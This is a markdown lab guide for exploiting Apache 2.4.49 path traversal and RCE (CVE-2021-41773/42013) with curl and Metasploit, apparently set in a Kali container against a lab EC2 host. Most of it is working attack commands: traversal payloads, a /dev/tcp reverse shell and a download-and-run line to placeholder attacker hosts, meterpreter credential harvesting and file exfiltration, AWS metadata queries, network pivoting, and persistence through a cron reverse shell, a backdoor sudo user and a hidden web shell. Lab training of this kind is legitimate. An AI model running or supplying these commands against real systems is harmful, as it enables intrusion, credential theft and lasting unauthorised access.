
## Metasploit (via RedAmon Kali Container)

### CVE-2021-41773 / CVE-2021-42013 (Path Traversal + RCE)

Both vulnerabilities affect **Apache 2.4.49** and exploit path traversal, but they differ in encoding technique and impact.

---

#### CVE-2021-41773 (October 4, 2021)

**The original vulnerability**

| Aspect | Details |
|--------|---------|
| **Encoding** | Single URL encoding: `%2e` → `.` |
| **Payload** | `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` |
| **Impact** | **File read only** (path traversal) |
| **CVSS** | 7.5 (High) |
| **Requirement** | `Require all granted` on directories outside docroot |

**How it works:**
1. Apache's path normalization failed to decode `%2e` (URL-encoded `.`) before checking for `../`
2. Attacker sends `/.%2e/` which bypasses the directory traversal filter
3. Apache decodes it to `/../` *after* the security check
4. Result: Read arbitrary files on the filesystem

**Example exploit:**
```bash
curl "http://target:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

---

#### CVE-2021-42013 (October 7, 2021)

**The bypass for the incomplete fix**

| Aspect | Details |
|--------|---------|
| **Encoding** | Double URL encoding: `%%32%65` → `%2e` → `.` |
| **Payload** | `/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` |
| **Impact** | **File read + RCE** (Remote Code Execution) |
| **CVSS** | 9.8 (Critical) |
| **Requirement** | Same + `mod_cgi` enabled for RCE |

**How it works:**
1. Apache patched CVE-2021-41773 by detecting `%2e`
2. But the fix didn't account for **double encoding**
3. `%%32%65` decodes in two steps:
   - First pass: `%%32%65` → `%2e` (decodes `%32` to `2`, `%65` to `e`)
   - Second pass: `%2e` → `.`
4. The security check happens between the two decoding passes, so it's bypassed

**Example exploits:**
```bash
# File read
curl "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# RCE (requires mod_cgi)
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

---

#### Key Differences Summary

| Feature | CVE-2021-41773 | CVE-2021-42013 |
|---------|----------------|----------------|
| **Encoding** | Single (`%2e`) | Double (`%%32%65`) |
| **Discovered** | Oct 4, 2021 | Oct 7, 2021 (3 days later) |
| **File Read** | Yes | Yes |
| **RCE** | No | **Yes** (with mod_cgi) |
| **CVSS** | 7.5 (High) | 9.8 (Critical) |
| **Patched in** | 2.4.50 (incomplete) | 2.4.51 |

---

#### From Path Traversal to RCE: How It Works

Path traversal alone only allows **reading files**. But when combined with Apache's CGI functionality, it becomes **Remote Code Execution (RCE)**.

---

##### Step 1: Path Traversal = File Read

The basic path traversal allows you to escape the web root and read any file:

```
Normal request:     GET /index.html           → /var/www/html/index.html
Path traversal:     GET /cgi-bin/../../../etc/passwd → /etc/passwd
```

**What you can do with file read:**
- Read `/etc/passwd` - list system users
- Read `/etc/shadow` - password hashes (if readable)
- Read config files - database credentials, API keys
- Read SSH keys - `/root/.ssh/id_rsa`
- Read source code - application secrets

---

##### Step 2: Path Traversal + CGI = RCE

The magic happens when you traverse to an **executable** through a CGI-enabled path:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  REQUEST                                                                    │
│  POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh                  │
│  Body: echo Content-Type: text/plain; echo; whoami                         │
├─────────────────────────────────────────────────────────────────────────────┤
│  WHAT HAPPENS                                                               │
│                                                                             │
│  1. Apache receives request to /cgi-bin/...                                │
│  2. Path traversal bypasses security → resolves to /bin/sh                 │
│  3. Apache sees /cgi-bin/ prefix → treats it as CGI script                 │
│  4. Apache EXECUTES /bin/sh as a CGI program                               │
│  5. POST body is piped to /bin/sh as stdin                                 │
│  6. Shell executes: echo Content-Type: text/plain; echo; whoami            │
│  7. Output returned as HTTP response                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│  RESPONSE                                                                   │
│  HTTP/1.1 200 OK                                                           │
│  Content-Type: text/plain                                                  │
│                                                                             │
│  root                                                                       │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

##### Why `/bin/sh` Works as CGI

CGI (Common Gateway Interface) is a protocol where:
1. Apache executes a program
2. HTTP request body → program's **stdin**
3. Program's **stdout** → HTTP response body

When you traverse to `/bin/sh`:
- Apache executes the shell
- Your POST data becomes shell commands
- Command output becomes the HTTP response

**The CGI header trick:**
```bash
echo Content-Type: text/plain; echo; id
#     ↑ CGI header required        ↑ blank line separates header from body
```

Without the `Content-Type` header, Apache returns 500 Internal Server Error.

---

##### Required Apache Configuration

For RCE to work, the server must have:

```apache
# 1. CGI module loaded
LoadModule cgi_module modules/mod_cgi.so

# 2. CGI execution enabled for /bin
<Directory "/bin">
    Options +ExecCGI
    SetHandler cgi-script
    Require all granted
</Directory>

# 3. Access granted to filesystem root
<Directory />
    Require all granted
</Directory>
```

---

##### Attack Flow Diagram

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Attacker   │────▶│    Apache    │────▶│   /bin/sh    │────▶│   System     │
│              │     │   (mod_cgi)  │     │  (executed)  │     │  (compromised)│
└──────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
       │                    │                    │                    │
       │ POST request       │ Path traversal     │ Commands from      │ Full shell
       │ with commands      │ bypasses filter    │ POST body          │ access
       └────────────────────┴────────────────────┴────────────────────┘
```

---

##### Practical Examples

**Execute single command:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
# Returns: uid=0(root) gid=0(root) groups=0(root)
```

**Read sensitive file:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; cat /etc/shadow"
```

**Reverse shell:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

**Download and execute payload:**
```bash
curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; curl http://attacker/payload.sh | bash"
```

---

#### Exploitation Types

**1. Path Traversal (File Read)**
- Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
- Gather credentials, SSH keys, API tokens
- Map the system structure

**2. Remote Code Execution (CVE-2021-42013 only)**
- Requires `mod_cgi` or `mod_cgid` enabled
- Traverse to `/bin/sh` and execute it as CGI
- Full shell access as the Apache user (often `www-data` or `root`)

**3. Post-Exploitation possibilities:**
- System reconnaissance
- Credential harvesting
- Lateral movement
- Persistence (backdoor users, SSH keys)
- Website defacement
- Pivot to internal network

---

#### Metasploit Exploitation

```bash
# Enter your own Kali sandbox with Metasploit (or open the Kali terminal in the Red Zone);
# list the sandboxes with: docker ps --filter label=redamon.sandbox=1
docker exec -it redamon-kali-<key>-<instance> msfconsole

# Search for the module
msf6 > search CVE-2021-42013

# Use the exploit (direct to EC2, bypass ALB); 192.0.2.10 stands for your lab host's address
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.0.2.10
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter/bind_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set LPORT 4444
msf6 exploit(multi/http/apache_normalize_path_rce) > exploit
```

> **Note**: Uses bind shell (EC2 listens, you connect). Requires port 4444 open in EC2 Security Group.

---

#### Understanding Metasploit Payloads

Use `show payloads` to list all compatible payloads for the exploit. Here's what the most important ones do:

##### Payload Categories

**Shell vs Meterpreter:**

| Type | Description | Use Case |
|------|-------------|----------|
| **shell** | Basic command shell (like SSH) | Simple, lightweight, less detectable |
| **meterpreter** | Advanced Metasploit shell | File upload/download, screenshot, keylogger, persistence |

**Bind vs Reverse:**

| Type | Direction | When to Use |
|------|-----------|-------------|
| **bind_tcp** | Target opens port → You connect TO target | You're behind NAT/firewall (home network) |
| **reverse_tcp** | Target connects → Back to YOU | Target is behind firewall, you have public IP |

```
BIND:     [Attacker] ────connect────▶ [Target:4444]
REVERSE:  [Attacker:4444] ◀────connect──── [Target]
```

**Staged vs Inline:**

| Type | Syntax | Size | How it works |
|------|--------|------|--------------|
| **Staged** | `shell/bind_tcp` | Small | Stage 1 downloads Stage 2 from Metasploit |
| **Inline** | `shell_bind_tcp` | Larger | Full payload in single shot |

> **Rule:** Use staged (`shell/`) when possible - smaller and more reliable.

---

##### Top 10 Most Useful Payloads

| # | Payload | Description | When to Use |
|---|---------|-------------|-------------|
| **16** | `linux/x64/shell/bind_tcp` | Basic shell, target listens | **Home network** (behind NAT) |
| **18** | `linux/x64/shell/reverse_tcp` | Basic shell, target connects back | **Cloud/VPS** (you have public IP) |
| **8** | `linux/x64/meterpreter/bind_tcp` | Advanced shell, target listens | Need file transfer, persistence |
| **10** | `linux/x64/meterpreter/reverse_tcp` | Advanced shell, target connects back | **Most powerful** - all features |
| **11** | `linux/x64/meterpreter_reverse_http` | Meterpreter over HTTP | **Firewall evasion** (port 80) |
| **12** | `linux/x64/meterpreter_reverse_https` | Meterpreter over HTTPS | **Stealth** - encrypted, looks normal |
| **7** | `linux/x64/exec` | Run single command | Quick command, no shell needed |
| **20** | `linux/x64/shell_bind_tcp` | Inline bind shell | No staging, single packet |
| **3** | `generic/shell_bind_tcp` | Universal bind shell | Works on any platform |
| **2** | `generic/shell_bind_aws_ssm` | AWS SSM connection | AWS-specific, uses SSM API |

---

##### Quick Decision Guide

```
Are you behind NAT/router at home?
├── YES → Use bind_tcp (target listens)
│         └── linux/x64/shell/bind_tcp
│         └── linux/x64/meterpreter/bind_tcp
│
└── NO (you have public IP or cloud VM)
    └── Use reverse_tcp (target connects to you)
        └── linux/x64/shell/reverse_tcp
        └── linux/x64/meterpreter/reverse_tcp

Need advanced features (file transfer, persistence)?
├── YES → Use meterpreter
└── NO → Use shell (lighter, stealthier)

Firewall blocking unusual ports?
└── YES → Use HTTP/HTTPS payloads
    └── linux/x64/meterpreter_reverse_http   (port 80)
    └── linux/x64/meterpreter_reverse_https  (port 443)
```

---

##### x64 vs x86

| Architecture | When to Use |
|--------------|-------------|
| **x64** | Modern 64-bit Linux (most servers today) |
| **x86** | Older 32-bit systems, or when x64 fails |

> **Tip:** Always try x64 first. If it fails, fallback to x86.

---

##### Why We Use `linux/x64/shell/bind_tcp`

In this setup:
1. **You're at home** behind a router/NAT
2. **EC2 is in the cloud** with a public IP
3. Your router blocks incoming connections (reverse shell fails)
4. With bind shell: EC2 opens port 4444, you connect TO it

```
[Your Home PC] ──────connect──────▶ [EC2:4444]
     (NAT)                           (public IP)
```

**Requirements for bind shell:**
- Port 4444 open in EC2 Security Group
- Port 4444 mapped in docker-compose.yml (`- "4444:4444"`)

---

##### Default Payload Behavior

If you don't set a payload, Metasploit uses a default (usually `cmd/unix/reverse_bash`):

```bash
# Without setting payload
msf6 > exploit
[-] Exploit failed: The target couldn't connect back to you
```

The default reverse shell tries to connect to your machine, but your router blocks it. **Always set the payload explicitly.**

### Post-Exploitation with Meterpreter

Once you have a Meterpreter session:

```bash
msf6 > sessions -i 1
meterpreter >
```

---

#### Core Meterpreter Commands

```bash
# Session info
meterpreter > sysinfo              # System information
meterpreter > getuid               # Current user
meterpreter > getpid               # Current process ID
meterpreter > getprivs             # List privileges

# Help
meterpreter > help                 # List all commands
meterpreter > help <command>       # Help for specific command
```

---

#### System Reconnaissance

```bash
# System information
meterpreter > sysinfo
meterpreter > shell -c "uname -a"
meterpreter > shell -c "cat /etc/os-release"

# Network information
meterpreter > ifconfig             # Network interfaces
meterpreter > arp                  # ARP table
meterpreter > netstat              # Network connections
meterpreter > route                # Routing table

# Process management
meterpreter > ps                   # List processes
meterpreter > getpid               # Current PID
meterpreter > migrate <PID>        # Migrate to another process

# Environment
meterpreter > getenv               # All environment variables
meterpreter > getenv PATH          # Specific variable
```

---

#### File System Operations

```bash
# Navigation
meterpreter > pwd                  # Current directory
meterpreter > cd /etc              # Change directory
meterpreter > ls                   # List files
meterpreter > ls -la /root         # List with details

# Read files
meterpreter > cat /etc/passwd      # Display file content
meterpreter > cat /etc/shadow      # Password hashes

# Download files (to your machine)
meterpreter > download /etc/passwd /tmp/passwd.txt
meterpreter > download /etc/shadow /tmp/shadow.txt
meterpreter > download -r /var/www/html /tmp/website

# Upload files (to target)
meterpreter > upload /tmp/backdoor.sh /tmp/backdoor.sh
meterpreter > upload linpeas.sh /tmp/linpeas.sh

# File operations
meterpreter > mkdir /tmp/exfil     # Create directory
meterpreter > rm /tmp/evidence.txt # Delete file
meterpreter > edit /etc/hosts      # Edit file in vim
meterpreter > search -f *.conf     # Search for files
meterpreter > search -f *password* # Find password files
```

---

#### Credential Harvesting

```bash
# Hash dumping
meterpreter > hashdump             # Dump password hashes (requires root)

# Search for credentials
meterpreter > search -f *.conf -d /etc
meterpreter > search -f *password* -d /
meterpreter > search -f *.env -d /var/www
meterpreter > search -f id_rsa -d /

# Download sensitive files
meterpreter > download /etc/shadow
meterpreter > download /root/.ssh/id_rsa
meterpreter > download /root/.bash_history

# Post modules for credential gathering
meterpreter > run post/linux/gather/hashdump
meterpreter > run post/multi/gather/ssh_creds
meterpreter > run post/linux/gather/enum_configs
```

---

#### Privilege Escalation

```bash
# Check current privileges
meterpreter > getuid
meterpreter > getprivs

# Automated privesc suggestions
meterpreter > run post/multi/recon/local_exploit_suggester

# Manual checks via shell
meterpreter > shell
$ sudo -l                          # Sudo permissions
$ find / -perm -4000 2>/dev/null   # SUID binaries
$ find / -perm -2000 2>/dev/null   # SGID binaries
$ cat /etc/crontab                 # Cron jobs
$ exit
```

---

#### Network Pivoting

Network pivoting uses a compromised machine as a bridge to reach internal networks that your attacking machine cannot access directly.

```
YOUR MACHINE ───────► COMPROMISED HOST ───────► INTERNAL NETWORK
(Attacker)            (The Bridge)              (Hidden targets)
```

---

##### Step 1: Reconnaissance - Understand the Network

First, gather information about what networks the compromised host can see:

```bash
# Check network interfaces - "What networks am I connected to?"
meterpreter > ipconfig

Interface  1
============
Name         : lo
IPv4 Address : 127.0.0.1           # Loopback (ignore)

Interface  2
============
Name         : eth0
IPv4 Address : 172.18.0.2          # ◄── This is the host's IP
IPv4 Netmask : 255.255.0.0         # ◄── /16 network = 65,534 possible hosts
```

```bash
# Check routing table - "How does this host reach other networks?"
meterpreter > route

    Subnet      Netmask      Gateway     Metric  Interface
    ------      -------      -------     ------  ---------
    0.0.0.0     0.0.0.0      172.18.0.1  0       eth0      # Default route (internet)
    172.18.0.0  255.255.0.0  0.0.0.0     0       eth0      # Local network (direct)
```

```bash
# Check ARP cache - "What hosts has this machine talked to?"
meterpreter > arp

    IP address  MAC address        Interface
    ----------  -----------        ---------
    172.18.0.1  1e:52:6c:2d:55:d8  eth0        # Gateway discovered
```

**What we learned:**
- Host is at `172.18.0.2` on a `/16` network
- Gateway is `172.18.0.1`
- Only the gateway has been contacted so far

---

##### Step 2: Find Additional Networks (AWS/Cloud)

If you're in a Docker container on AWS EC2, find the EC2's VPC IP:

```bash
meterpreter > shell

# Get EC2 instance's internal IP
curl -s http://169.254.169.254/latest/meta-data/local-ipv4
# Output: 10.0.1.50 (example VPC IP)

# Get VPC CIDR block
curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/
# Then: curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-ipv4-cidr-block

# Check what the host can reach
cat /proc/net/arp
ip neigh

exit
```

---

##### Step 3: Set Up Pivot Routes

Tell Metasploit to route traffic through the Meterpreter session:

```bash
# Add route to the Docker network
meterpreter > run autoroute -s 172.18.0.0/16

# If you found a VPC network, add that too
meterpreter > run autoroute -s 10.0.0.0/16

# Verify routes are set
meterpreter > run autoroute -p

Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   172.18.0.0         255.255.0.0        Session 1
   10.0.0.0           255.255.0.0        Session 1
```

**What autoroute does:**
```
Before: Your Machine ──✗──► 172.18.0.0/16 (unreachable)

After:  Your Machine ──► Meterpreter Session ──► 172.18.0.0/16 (works!)
                         (traffic tunneled)
```

---

##### Step 4: Discover Hosts on Internal Network

Now scan through the pivot:

```bash
# Background the session first
meterpreter > background

# Option A: TCP Port Scan (most reliable)
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.18.0.0/24
msf6 > set PORTS 22,80,443,3306,5432,8080
msf6 > set THREADS 10
msf6 > run

# Option B: Ping Sweep
msf6 > use post/multi/gather/ping_sweep
msf6 > set RHOSTS 172.18.0.0/24
msf6 > set SESSION 1
msf6 > run
```

**Alternative: Scan from shell (no autoroute needed)**

```bash
meterpreter > shell

# Quick ping sweep
for i in $(seq 1 254); do
  ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" &
done
wait

# Port check using bash
for ip in $(seq 1 10); do
  (echo >/dev/tcp/172.18.0.$ip/80) 2>/dev/null && echo "172.18.0.$ip:80 open"
  (echo >/dev/tcp/172.18.0.$ip/22) 2>/dev/null && echo "172.18.0.$ip:22 open"
done

# Check ARP table for discovered hosts
cat /proc/net/arp

exit
```

---

##### Step 5: Port Forwarding (Access Specific Services)

Forward internal ports to your local machine:

```bash
meterpreter > portfwd add -l 3306 -p 3306 -r 172.18.0.100
#                         │       │       └── Remote host (internal)
#                         │       └── Remote port
#                         └── Local port (on your machine)

meterpreter > portfwd add -l 8080 -p 80 -r 172.18.0.5
meterpreter > portfwd list
meterpreter > portfwd delete -l 3306
```

Now you can access `172.18.0.100:3306` via `localhost:3306`:

```bash
# From your machine
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

##### Step 6: SOCKS Proxy (Full Network Access)

For complete access to the internal network:

```bash
meterpreter > background

# Set up SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j

# Now use proxychains on your machine
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 172.18.0.0/24
proxychains curl http://172.18.0.5
proxychains ssh user@172.18.0.10
```

---

##### Pivoting Summary

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `ipconfig` | Find what networks exist |
| 2 | `route` | See how traffic flows |
| 3 | `arp` | See known hosts |
| 4 | `run autoroute -s <network>` | Route traffic through session |
| 5 | `auxiliary/scanner/portscan/tcp` | Scan internal network |
| 6 | `portfwd add -l -p -r` | Access specific services |
| 7 | `auxiliary/server/socks_proxy` | Full network proxy |

---

##### Visual: Complete Pivot Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                        PIVOTING PROCESS                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. RECON              2. AUTOROUTE           3. SCAN/EXPLOIT       │
│  ─────────             ───────────            ───────────────       │
│                                                                     │
│  ┌─────────┐          ┌─────────┐            ┌─────────┐           │
│  │ ipconfig│          │autoroute│            │ portscan│           │
│  │ route   │────────► │   -s    │──────────► │ portfwd │           │
│  │ arp     │          │ network │            │  socks  │           │
│  └─────────┘          └─────────┘            └─────────┘           │
│       │                    │                      │                 │
│       ▼                    ▼                      ▼                 │
│  "What can I          "Send my               "Exploit the          │
│   reach?"              traffic               internal              │
│                        through                targets"              │
│                        session"                                     │
│                                                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  YOUR MACHINE          PIVOT HOST             INTERNAL NETWORK      │
│  ┌──────────┐         ┌──────────┐           ┌──────────────────┐  │
│  │          │         │172.18.0.2│           │ 172.18.0.1 (GW)  │  │
│  │ Attacker │◄───────►│          │◄─────────►│ 172.18.0.5 (Web) │  │
│  │          │ Session │ Hacked   │  Direct   │ 172.18.0.10 (DB) │  │
│  └──────────┘         │ Machine  │           │ 10.0.0.x (VPC)   │  │
│                       └──────────┘           └──────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```



---

#### Persistence

```bash
# SSH key persistence
meterpreter > run post/linux/manage/sshkey_persistence

# Cron persistence
meterpreter > shell
$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /var/spool/cron/crontabs/root
$ exit

# Backdoor user
meterpreter > shell
$ useradd -m -s /bin/bash backdoor
$ echo "backdoor:password123" | chpasswd
$ usermod -aG sudo backdoor
$ exit

# Web shell persistence
meterpreter > upload webshell.php /var/www/html/.hidden.php
```

---

#### Post-Exploitation Modules

```bash
# System enumeration
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/enum_network
meterpreter > run post/linux/gather/enum_configs
meterpreter > run post/linux/gather/enum_protections

# Credential gathering
meterpreter > run post/linux/gather/hashdump
meterpreter > run post/multi/gather/ssh_creds
meterpreter > run post/linux/gather/pptpd_chap_secrets

# Privilege escalation recon
meterpreter > run post/multi/recon/local_exploit_suggester

# Network recon
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24

# Persistence
meterpreter > run post/linux/manage/sshkey_persistence
```

---

#### Shell Access

```bash
# Drop to system shell
meterpreter > shell
$ whoami
$ id
$ exit

# Run single command
meterpreter > shell -c "cat /etc/passwd"
meterpreter > execute -f "/bin/bash" -c -i
```

---

#### Data Exfiltration

```bash
# Download important files
meterpreter > download /etc/passwd
meterpreter > download /etc/shadow
meterpreter > download /root/.ssh/id_rsa
meterpreter > download /var/www/html/config.php

# Download entire directories
meterpreter > download -r /var/www/html /tmp/website_backup
meterpreter > download -r /home /tmp/home_backup

# Search and download
meterpreter > search -f *.sql -d /var
meterpreter > search -f *backup* -d /
```

---

#### Session Management

```bash
# Background session (keep alive)
meterpreter > background
# or Ctrl+Z

# List all sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i 1

# Upgrade shell to meterpreter
msf6 > sessions -u 1

# Kill session
msf6 > sessions -k 1

# Kill all sessions
msf6 > sessions -K
```

---

#### Quick Reference Card

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `ps` | List processes |
| `migrate <PID>` | Move to another process |
| `shell` | Drop to system shell |
| `upload <src> <dst>` | Upload file to target |
| `download <src> <dst>` | Download file from target |
| `cat <file>` | Read file |
| `search -f <pattern>` | Search for files |
| `hashdump` | Dump password hashes |
| `portfwd add -l -p -r` | Port forwarding |
| `run autoroute -s` | Add network route |
| `background` | Background session |
| `sessions -i <id>` | Interact with session |

---



meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    chmod                     Change the permissions of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    shell                     Drop into a system command shell
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Mic Commands
====================

    Command                   Description
    -------                   -----------
    listen                    listen to a saved audio recording via audio player
    mic_list                  list all microphone interfaces
    mic_start                 start capturing an audio stream from the target mic
    mic_stop                  stop capturing audio


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system